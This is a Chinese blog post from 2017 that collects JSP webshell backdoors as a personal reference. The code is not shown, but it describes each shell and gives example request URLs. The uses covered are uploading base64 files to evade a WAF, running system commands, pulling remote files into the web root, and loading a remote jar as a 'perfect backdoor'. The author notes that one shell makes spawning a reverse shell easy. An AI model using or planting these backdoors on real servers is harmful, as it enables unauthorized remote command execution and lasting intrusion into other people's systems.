jsp 小后门

发表于 2017-03-12 | 分类于 Web安全 | 热度 ℃

总结整理一些jsp的马

上传

下面是两款用于上传的。

JSP一句话

base64 编码上传

写入base64编码字符 服务端解码成正常文件，可用来绕过waf 、写二进制文件

园长blog上的

因为每次要用到关于jsp的后门、都得跑去园长的博客去翻，所以就索性在这里整理一遍。

执行系统命令:

请求：http://192.168.16.240:8080/Shell/cmd2.jsp?i=ls

执行之后不会有任何回显，用来反弹个 shell 很方便。

有回显带密码验证的:

请求：http://192.168.16.240:8080/Shell/cmd2.jsp?pwd=023&i=ifconfig

下载远程文件(不用apache io utils的话没办法把inputstream转byte,所以很长…)

请求：http://192.168.16.240:8080/Shell/download.jsp?f=/wwwroot/1.png&u=http://www.baidu.com/img/bdlogo.png

下载到web路径:

请求：http://192.168.16.240:8080/Shell/download.jsp?f=1.png&u=http://www.baidu.com/img/bdlogo.png

反射调用外部jar,完美后门

如果嫌弃上面的后门功能太弱太陈旧可以试试这个：

请求：http://192.168.16.240:8080/Shell/reflect.jsp?u=http://javaweb.org/Cat.jar&023=A
